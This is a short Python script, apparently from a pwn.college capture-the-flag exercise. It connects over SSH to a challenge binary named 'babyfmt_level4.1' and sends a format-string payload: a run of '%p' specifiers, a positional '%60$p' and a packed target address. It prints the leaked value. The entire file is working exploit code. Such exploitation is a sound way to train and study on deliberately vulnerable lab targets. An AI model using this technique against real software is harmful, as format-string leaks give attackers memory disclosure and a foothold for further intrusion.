import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

fmt = ("AAA " + "%p " * 80 + "|%60$p").encode()
payload = fmt + b"B" * 4 + struct.pack("<Q", ADDR)

res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out = res.stdout.decode("latin-1", errors="ignore")

line = next((l for l in out.splitlines() if l.startswith("AAA ")), "")
if line:
    print(line.split("|")[-1])
